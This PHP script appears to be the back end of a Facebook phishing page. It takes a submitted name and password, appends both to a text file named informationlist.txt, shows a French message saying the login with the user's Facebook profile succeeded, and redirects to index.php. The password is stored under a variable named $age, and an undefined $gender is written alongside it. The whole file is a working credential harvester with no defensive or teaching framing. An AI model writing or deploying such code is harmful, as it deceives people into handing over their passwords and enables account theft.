<?php
session_start();
$errmsg_arr = array();
$errflag = false;
$name 	= trim($_REQUEST["name"]);
$age 	= trim($_REQUEST["passw"]);

$filename	= "informationlist.txt";
$MyFile 	= fopen($filename, "a");
$newline=$name.','.$age.','.$gender."\r\n";		
fwrite($MyFile, $newline);
fclose($MyFile);
$errmsg_arr[] = $name.'connexion effectuer avec votre profile facebook';
$errflag = true;
if($errflag) {
	$_SESSION['ERRMSG_ARR'] = $errmsg_arr;
	session_write_close();
	header("location: index.php");
	exit();
}
die;
?>